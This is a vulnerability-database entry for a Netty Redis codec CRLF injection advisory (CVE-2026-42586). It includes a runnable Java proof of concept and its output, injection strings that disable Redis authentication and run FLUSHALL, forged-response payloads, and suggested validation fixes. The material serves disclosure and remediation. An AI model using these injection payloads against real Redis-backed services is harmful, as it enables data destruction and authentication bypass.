@@ -1,0 +1,605 @@
+advisory_id: GHSA-rgrr-p7gp-5xj7
+datasource_id: github_osv/GHSA-rgrr-p7gp-5xj7
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-rgrr-p7gp-5xj7/GHSA-rgrr-p7gp-5xj7.json
+aliases:
+  - CVE-2026-42586
+summary: |
+  Netty Redis Codec Encoder has a CRLF Injection Issue
+  # Security Vulnerability Report: CRLF Injection in Netty Redis Codec Encoder
+
+  ## 1. Vulnerability Summary
+
+  | Field | Value |
+  |-------|-------|
+  | **Product** | Netty |
+  | **Version** | 4.2.12.Final (and all prior versions with codec-redis) |
+  | **Component** | `io.netty.handler.codec.redis.RedisEncoder` |
+  | **Vulnerability Type** | CWE-93: Improper Neutralization of CRLF Sequences (CRLF Injection) |
+  | **Impact** | Redis Command Injection / Response Poisoning |
+  | **Attack Vector** | Network |
+  | **Attack Complexity** | Low |
+  | **Privileges Required** | None |
+  | **User Interaction** | None |
+  | **Scope** | Unchanged |
+  | **Confidentiality Impact** | High |
+  | **Integrity Impact** | High |
+  | **Availability Impact** | None |
+
+  ## 2. Affected Components
+
+  The following classes in the `codec-redis` module are affected:
+
+  - `io.netty.handler.codec.redis.RedisEncoder` (encoder - no output validation)
+  - `io.netty.handler.codec.redis.InlineCommandRedisMessage` (no input validation)
+  - `io.netty.handler.codec.redis.SimpleStringRedisMessage` (no input validation)
+  - `io.netty.handler.codec.redis.ErrorRedisMessage` (no input validation)
+  - `io.netty.handler.codec.redis.AbstractStringRedisMessage` (base class - no validation)
+
+  ## 3. Vulnerability Description
+
+  The Netty Redis codec encoder (`RedisEncoder`) writes user-controlled string content directly to the network output buffer without validating or sanitizing CRLF (`\r\n`) characters. Since the Redis Serialization Protocol (RESP) uses CRLF as the command/response delimiter, an attacker who can control the content of a Redis message can inject arbitrary Redis commands or forge fake responses.
+
+  ### Root Cause
+
+  In `RedisEncoder.java`, the `writeString()` method (lines 103-111) writes content using `ByteBufUtil.writeUtf8()` without any validation:
+
+  ```java
+  private static void writeString(ByteBufAllocator allocator, RedisMessageType type,
+                                  String content, List<Object> out) {
+      ByteBuf buf = allocator.ioBuffer(type.length() + ByteBufUtil.utf8MaxBytes(content) +
+                                       RedisConstants.EOL_LENGTH);
+      type.writeTo(buf);
+      ByteBufUtil.writeUtf8(buf, content);       // <-- NO CRLF VALIDATION
+      buf.writeShort(RedisConstants.EOL_SHORT);   // <-- Appends \r\n
+      out.add(buf);
+  }
+  ```
+
+  The message constructors (`InlineCommandRedisMessage`, `SimpleStringRedisMessage`, `ErrorRedisMessage`) inherit from `AbstractStringRedisMessage`, which only checks for null:
+
+  ```java
+  // AbstractStringRedisMessage.java:30-32
+  AbstractStringRedisMessage(String content) {
+      this.content = ObjectUtil.checkNotNull(content, "content");
+      // NO CRLF validation
+  }
+  ```
+
+  ### Comparison with Similar Fixed CVEs
+
+  This vulnerability follows the exact same pattern as two previously acknowledged Netty CVEs:
+
+  | CVE | Component | Fix |
+  |-----|-----------|-----|
+  | **GHSA-jq43-27x9-3v86** | SmtpRequestEncoder - SMTP command injection | Added `SmtpUtils.validateSMTPParameters()` to check for `\r` and `\n` |
+  | **GHSA-84h7-rjj3-6jx4** | HttpRequestEncoder - CRLF in URI | Added `HttpUtil.validateRequestLineTokens()` to check for `\r`, `\n`, and SP |
+
+  The Redis codec has **no equivalent validation** in either the encoder or the message constructors.
+
+  ## 4. Exploitability Prerequisites
+
+  This vulnerability is exploitable when **all** of the following conditions are met:
+
+  1. The application uses Netty's `codec-redis` module to communicate with a Redis server
+  2. User-controlled input is placed into `InlineCommandRedisMessage`, `SimpleStringRedisMessage`, or `ErrorRedisMessage` content
+  3. The application does **not** perform its own CRLF sanitization before constructing these message objects
+
+  **Important context**: Most production Redis clients built on Netty use the RESP array format (`ArrayRedisMessage` + `BulkStringRedisMessage`), which uses binary-safe length-prefixed encoding and is **not** affected by this vulnerability. The vulnerability specifically affects the text-based inline command mode and simple string/error response types, which use CRLF as protocol delimiters.
+
+  **Affected use cases include**:
+  - Custom Redis clients or proxies that use `InlineCommandRedisMessage` for simplicity
+  - Redis middleware/proxy layers that forward `SimpleStringRedisMessage` or `ErrorRedisMessage` responses
+  - Applications that construct Redis monitoring or diagnostic commands from user input
+  - Redis Sentinel or Cluster management tools using inline command format
+
+  ## 5. Attack Scenarios
+
+  ### Scenario 1: Redis Command Injection via Inline Commands
+
+  When Netty is used as a Redis client or proxy, and user-controlled data is placed into `InlineCommandRedisMessage`, an attacker can inject arbitrary Redis commands:
+
+  ```java
+  // Application code that builds Redis commands from user input
+  String userKey = request.getParameter("key");  // Attacker controls this
+  InlineCommandRedisMessage msg = new InlineCommandRedisMessage("GET " + userKey);
+  channel.writeAndFlush(msg);
+  ```
+
+  **Attack input**: `key = "foo\r\nCONFIG SET requirepass \"\"\r\nFLUSHALL"`
+
+  **Result**: Three commands sent to Redis:
+  1. `GET foo`
+  2. `CONFIG SET requirepass ""` (removes authentication!)
+  3. `FLUSHALL` (deletes all data!)
+
+  ### Scenario 2: Redis Response Poisoning
+
+  When Netty is used as a Redis proxy/middleware, a malicious upstream Redis server (or MITM attacker) can inject fake responses:
+
+  ```java
+  // Proxy forwarding a simple string response
+  SimpleStringRedisMessage response = new SimpleStringRedisMessage(upstreamResponse);
+  downstreamChannel.writeAndFlush(response);
+  ```
+
+  **Malicious upstream response**: `"OK\r\n$6\r\nhacked"`
+
+  **Client sees**:
+  1. Simple String: `+OK` (expected response)
+  2. Bulk String: `$6\r\nhacked` (injected fake data!)
+
+  ### Scenario 3: Error Message Injection
+
+  ```java
+  ErrorRedisMessage error = new ErrorRedisMessage("ERR " + errorDetail);
+  ```
+
+  **Attack input**: `errorDetail = "unknown\r\n+FAKE_SUCCESS"`
+
+  **Client sees**:
+  1. Error: `-ERR unknown`
+  2. Simple String: `+FAKE_SUCCESS` (injected fake success!)
+
+  ## 6. Proof of Concept
+
+  ### Full Runnable PoC Source Code (RedisEncoderCRLFInjectionPoC.java)
+
+  ```java
+  import io.netty.buffer.ByteBuf;
+  import io.netty.buffer.ByteBufUtil;
+  import io.netty.buffer.UnpooledByteBufAllocator;
+  import io.netty.channel.ChannelHandlerContext;
+  import io.netty.channel.embedded.EmbeddedChannel;
+  import io.netty.handler.codec.redis.*;
+
+  import java.nio.charset.StandardCharsets;
+  import java.util.List;
+  import java.util.ArrayList;
+
+  /**
+   * PoC: Redis Encoder CRLF Injection Vulnerability
+   *
+   * Demonstrates that InlineCommandRedisMessage, SimpleStringRedisMessage,
+   * and ErrorRedisMessage do not validate content for CRLF characters,
+   * allowing Redis command injection via the RESP protocol.
+   */
+  public class RedisEncoderCRLFInjectionPoC {
+
+      public static void main(String[] args) {
+          System.out.println("=== Netty Redis Encoder CRLF Injection PoC ===\n");
+
+          testInlineCommandInjection();
+          testSimpleStringInjection();
+          testErrorMessageInjection();
+
+          System.out.println("\n=== PoC Complete ===");
+      }
+
+      /**
+       * Test 1: Inline Command Injection
+       * An attacker-controlled string injected into InlineCommandRedisMessage
+       * results in multiple Redis commands being sent.
+       */
+      static void testInlineCommandInjection() {
+          System.out.println("[TEST 1] Inline Command CRLF Injection");
+          System.out.println("----------------------------------------");
+
+          // Malicious content: inject FLUSHALL after a benign PING
+          String maliciousContent = "PING\r\nCONFIG SET requirepass \"\"\r\nFLUSHALL";
+
+          EmbeddedChannel channel = new EmbeddedChannel(new RedisEncoder());
+
+          // This should be rejected but is accepted
+          InlineCommandRedisMessage msg = new InlineCommandRedisMessage(maliciousContent);
+          channel.writeOutbound(msg);
+
+          ByteBuf output = channel.readOutbound();
+          String encoded = output.toString(StandardCharsets.UTF_8);
+          output.release();
+          channel.finishAndReleaseAll();
+
+          System.out.println("Input:   InlineCommandRedisMessage(\"" +
+                             maliciousContent.replace("\r", "\\r").replace("\n", "\\n") + "\")");
+          System.out.println("Encoded: \"" +
+                             encoded.replace("\r", "\\r").replace("\n", "\\n") + "\"");
+
+          // Count how many CRLF-delimited commands are in the output
+          String[] commands = encoded.split("\r\n");
+          System.out.println("Number of commands parsed by Redis: " + commands.length);
+          for (int i = 0; i < commands.length; i++) {
+              if (!commands[i].isEmpty()) {
+                  System.out.println("  Command " + (i + 1) + ": " + commands[i]);
+              }
+          }
+
+          boolean vulnerable = commands.length > 1;
+          System.out.println("VULNERABLE: " + (vulnerable ? "YES - Multiple commands injected!" : "NO"));
+          System.out.println();
+      }
+
+      /**
+       * Test 2: SimpleString Response Injection
+       * When Netty acts as a Redis proxy/middleware, a malicious SimpleString
+       * can inject fake responses to the downstream client.
+       */
+      static void testSimpleStringInjection() {
+          System.out.println("[TEST 2] SimpleString Response CRLF Injection");
+          System.out.println("----------------------------------------------");
+
+          // Malicious content: inject a fake bulk string response after OK
+          String maliciousContent = "OK\r\n$6\r\nhacked";
+
+          EmbeddedChannel channel = new EmbeddedChannel(new RedisEncoder());
+
+          SimpleStringRedisMessage msg = new SimpleStringRedisMessage(maliciousContent);
+          channel.writeOutbound(msg);
+
+          ByteBuf output = channel.readOutbound();
+          String encoded = output.toString(StandardCharsets.UTF_8);
+          output.release();
+          channel.finishAndReleaseAll();
+
+          System.out.println("Input:   SimpleStringRedisMessage(\"" +
+                             maliciousContent.replace("\r", "\\r").replace("\n", "\\n") + "\")");
+          System.out.println("Encoded: \"" +
+                             encoded.replace("\r", "\\r").replace("\n", "\\n") + "\"");
+
+          // The RESP protocol uses the first byte to determine type:
+          // '+' = Simple String, '$' = Bulk String
+          // A client parsing this would see:
+          // 1. "+OK\r\n"       -> Simple String "OK"
+          // 2. "$6\r\nhacked"  -> Bulk String "hacked" (injected!)
+          boolean vulnerable = encoded.contains("+OK\r\n$6\r\nhacked");
+          System.out.println("VULNERABLE: " + (vulnerable ? "YES - Response poisoning possible!" : "NO"));
+          System.out.println();
+      }
+
+      /**
+       * Test 3: Error Message Injection
+       * Similar to SimpleString but with error messages.
+       */
+      static void testErrorMessageInjection() {
+          System.out.println("[TEST 3] Error Message CRLF Injection");
+          System.out.println("--------------------------------------");
+
+          String maliciousContent = "ERR unknown\r\n+INJECTED_OK";
+
+          EmbeddedChannel channel = new EmbeddedChannel(new RedisEncoder());
+
+          ErrorRedisMessage msg = new ErrorRedisMessage(maliciousContent);
+          channel.writeOutbound(msg);
+
+          ByteBuf output = channel.readOutbound();
+          String encoded = output.toString(StandardCharsets.UTF_8);
+          output.release();
+          channel.finishAndReleaseAll();
+
+          System.out.println("Input:   ErrorRedisMessage(\"" +
+                             maliciousContent.replace("\r", "\\r").replace("\n", "\\n") + "\")");
+          System.out.println("Encoded: \"" +
+                             encoded.replace("\r", "\\r").replace("\n", "\\n") + "\"");
+
+          boolean vulnerable = encoded.contains("-ERR unknown\r\n+INJECTED_OK");
+          System.out.println("VULNERABLE: " + (vulnerable ? "YES - Error + fake OK injected!" : "NO"));
+          System.out.println();
+      }
+  }
+  ```
+
+  ### How to Compile and Run
+
+  ```bash
+  # Build Netty (skip tests for speed)
+  ./mvnw install -pl common,buffer,codec,codec-redis,transport -DskipTests -Dcheckstyle.skip=true \
+    -Denforcer.skip=true -Djapicmp.skip=true -Danimal.sniffer.skip=true \
+    -Drevapi.skip=true -Dforbiddenapis.skip=true -Dspotbugs.skip=true -q
+
+  # Set classpath
+  JARS=$(find ~/.m2/repository/io/netty -name "netty-*.jar" -path "*/4.2.12.Final/*" \
+    | grep -v sources | grep -v javadoc | tr '\n' ':')
+
+  # Compile and run
+  javac -cp "$JARS" RedisEncoderCRLFInjectionPoC.java
+  java -cp "$JARS:." RedisEncoderCRLFInjectionPoC
+  ```
+
+  ### PoC Execution Output (Verified on Netty 4.2.12.Final)
+
+  ```
+  === Netty Redis Encoder CRLF Injection PoC ===
+
+  [TEST 1] Inline Command CRLF Injection
+  ----------------------------------------
+  Input:   InlineCommandRedisMessage("PING\r\nCONFIG SET requirepass ""\r\nFLUSHALL")
+  Encoded: "PING\r\nCONFIG SET requirepass ""\r\nFLUSHALL\r\n"
+  Number of commands parsed by Redis: 3
+    Command 1: PING
+    Command 2: CONFIG SET requirepass ""
+    Command 3: FLUSHALL
+  VULNERABLE: YES - Multiple commands injected!
+
+  [TEST 2] SimpleString Response CRLF Injection
+  ----------------------------------------------
+  Input:   SimpleStringRedisMessage("OK\r\n$6\r\nhacked")
+  Encoded: "+OK\r\n$6\r\nhacked\r\n"
+  VULNERABLE: YES - Response poisoning possible!
+
+  [TEST 3] Error Message CRLF Injection
+  --------------------------------------
+  Input:   ErrorRedisMessage("ERR unknown\r\n+INJECTED_OK")
+  Encoded: "-ERR unknown\r\n+INJECTED_OK\r\n"
+  VULNERABLE: YES - Error + fake OK injected!
+
+
+  === PoC Complete ===
+  ```
+
+  ## 7. Impact Analysis
+
+  | Impact Category | Description |
+  |----------------|-------------|
+  | **Confidentiality** | HIGH - Attacker can execute `CONFIG GET` to extract sensitive Redis configuration, use `KEYS *` to enumerate all data |
+  | **Integrity** | HIGH - Attacker can execute `SET`/`DEL`/`FLUSHALL` to modify or destroy data, `CONFIG SET` to change server configuration |
+  | **Availability** | Can be HIGH - `FLUSHALL` destroys all data, `SHUTDOWN` stops the server, `DEBUG SLEEP` causes DoS |
+  | **Authentication Bypass** | `CONFIG SET requirepass ""` removes authentication |
+  | **Data Exfiltration** | Lua scripting via `EVAL` enables complex data extraction |
+
+  ## 8. Remediation Recommendations
+
+  ### Option 1: Validate in Message Constructors (Recommended)
+
+  Add CRLF validation to `AbstractStringRedisMessage`:
+
+  ```java
+  AbstractStringRedisMessage(String content) {
+      this.content = ObjectUtil.checkNotNull(content, "content");
+      validateContent(content);
+  }
+
+  private static void validateContent(String content) {
+      for (int i = 0; i < content.length(); i++) {
+          char c = content.charAt(i);
+          if (c == '\r' || c == '\n') {
+              throw new IllegalArgumentException(
+                  "Redis message content contains illegal CRLF character at index " + i);
+          }
+      }
+  }
+  ```
+
+  ### Option 2: Validate in Encoder (Defense-in-Depth)
+
+  Add validation in `RedisEncoder.writeString()`:
+
+  ```java
+  private static void writeString(ByteBufAllocator allocator, RedisMessageType type,
+                                  String content, List<Object> out) {
+      for (int i = 0; i < content.length(); i++) {
+          char c = content.charAt(i);
+          if (c == '\r' || c == '\n') {
+              throw new RedisCodecException(
+                  "Redis message content contains CRLF at index " + i);
+          }
+      }
+      // ... existing encoding logic
+  }
+  ```
+
+  ### Option 3: Both (Best Practice)
+
+  Apply validation in both the constructor and the encoder, following the pattern used for SMTP:
+  - `SmtpUtils.validateSMTPParameters()` validates in `DefaultSmtpRequest` constructor
+  - This provides defense-in-depth against custom `SmtpRequest` implementations
+
+  ## 9. Resources
+
+  - [RESP Protocol Specification](https://redis.io/docs/reference/protocol-spec/)
+  - [CWE-93: Improper Neutralization of CRLF Sequences](https://cwe.mitre.org/data/definitions/93.html)
+  - [GHSA-jq43-27x9-3v86: Netty SMTP Command Injection](https://github.com/netty/netty/security/advisories/GHSA-jq43-27x9-3v86)
+  - [GHSA-84h7-rjj3-6jx4: Netty HTTP CRLF Injection](https://github.com/netty/netty/security/advisories/GHSA-84h7-rjj3-6jx4)
+impacted_packages:
+  - purl: pkg:maven/io.netty/netty-codec-redis
+    affected_versions: vers:maven/>=4.2.0.Alpha1|<=4.2.12.Final
+    fixed_versions: vers:maven/4.2.13.Final
+    affected_packages:
+      - pkg:maven/io.netty/netty-codec-redis@4.2.0.Alpha1
+      - pkg:maven/io.netty/netty-codec-redis@4.2.0.Alpha2
+      - pkg:maven/io.netty/netty-codec-redis@4.2.0.Alpha3
+      - pkg:maven/io.netty/netty-codec-redis@4.2.0.Alpha4
+      - pkg:maven/io.netty/netty-codec-redis@4.2.0.Alpha5
+      - pkg:maven/io.netty/netty-codec-redis@4.2.0.Beta1
+      - pkg:maven/io.netty/netty-codec-redis@4.2.0.RC1
+      - pkg:maven/io.netty/netty-codec-redis@4.2.0.RC2
+      - pkg:maven/io.netty/netty-codec-redis@4.2.0.RC3
+      - pkg:maven/io.netty/netty-codec-redis@4.2.0.RC4
+      - pkg:maven/io.netty/netty-codec-redis@4.2.0.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.2.1.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.2.2.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.2.3.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.2.4.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.2.5.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.2.6.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.2.7.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.2.8.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.2.9.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.2.10.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.2.11.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.2.12.Final
+    fixed_packages:
+      - pkg:maven/io.netty/netty-codec-redis@4.2.13.Final
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:maven/io.netty/netty-codec-redis
+    affected_versions: vers:maven/<=4.1.132.Final
+    fixed_versions: vers:maven/4.1.133.Final
+    affected_packages:
+      - pkg:maven/io.netty/netty-codec-redis@4.1.0.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.1.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.2.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.3.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.4.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.5.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.6.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.7.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.8.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.9.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.10.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.11.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.12.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.13.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.14.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.15.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.16.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.17.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.18.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.19.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.20.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.21.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.22.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.23.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.24.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.25.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.26.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.27.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.28.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.29.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.30.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.31.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.32.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.33.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.34.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.35.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.36.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.37.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.38.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.39.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.40.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.41.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.42.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.43.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.44.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.45.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.46.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.47.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.48.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.49.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.50.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.51.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.52.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.53.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.54.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.55.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.56.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.57.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.58.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.59.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.60.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.61.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.62.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.63.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.64.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.65.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.66.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.67.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.68.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.69.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.70.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.71.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.72.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.73.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.74.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.75.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.76.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.77.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.78.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.79.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.80.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.81.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.82.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.83.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.84.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.85.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.86.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.87.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.88.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.89.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.90.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.91.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.92.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.93.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.94.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.95.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.96.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.97.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.98.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.99.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.100.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.101.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.102.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.103.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.104.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.105.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.106.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.107.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.108.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.109.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.110.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.111.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.112.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.113.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.114.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.115.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.116.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.117.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.118.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.119.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.120.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.121.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.122.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.123.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.124.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.125.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.126.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.127.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.128.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.129.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.130.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.131.Final
+      - pkg:maven/io.netty/netty-codec-redis@4.1.132.Final
+    fixed_packages:
+      - pkg:maven/io.netty/netty-codec-redis@4.1.133.Final
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '6.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-rgrr-p7gp-5xj7/GHSA-rgrr-p7gp-5xj7.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-93
+references:
+  - url: https://github.com/netty/netty
+    reference_type:
+    reference_id:
+  - url: https://redis.io/docs/reference/protocol-spec
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-42586
+    reference_type:
+    reference_id: CVE-2026-42586
+  - url: https://github.com/netty/netty/security/advisories/GHSA-84h7-rjj3-6jx4
+    reference_type:
+    reference_id: GHSA-84h7-rjj3-6jx4
+  - url: https://github.com/netty/netty/security/advisories/GHSA-jq43-27x9-3v86
+    reference_type:
+    reference_id: GHSA-jq43-27x9-3v86
+  - url: https://github.com/netty/netty/security/advisories/GHSA-rgrr-p7gp-5xj7
+    reference_type:
+    reference_id: GHSA-rgrr-p7gp-5xj7
+exploits: []
